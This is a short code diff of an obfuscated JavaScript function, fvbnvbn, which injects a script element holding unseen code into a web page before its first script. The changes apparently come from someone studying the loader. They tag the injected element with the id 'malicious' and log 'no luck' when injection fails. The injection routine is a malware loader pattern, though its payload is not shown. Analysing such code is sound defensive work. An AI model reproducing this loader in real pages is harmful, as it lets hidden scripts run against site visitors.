@@ -6,6 +6,7 @@ function fvbnvbn()/*s17192d31922hfj28896fs*/ {
     c = document;
     b = c["createElement"]("script");
     b["type"] = "text/javascript";
+    b["id"] = "malicious";
     b["text"] = a;
     a = c["getElementsByTagName"]("script")[0];
     a.parentNode["insertBefore"](b, a);
@@ -14,6 +15,7 @@ function fvbnvbn()/*s17192d31922hfj28896fs*/ {
 try {
     fvbnvbn()
 } catch (m) {
+    console.log('no luck')
 }
 
 function l() {
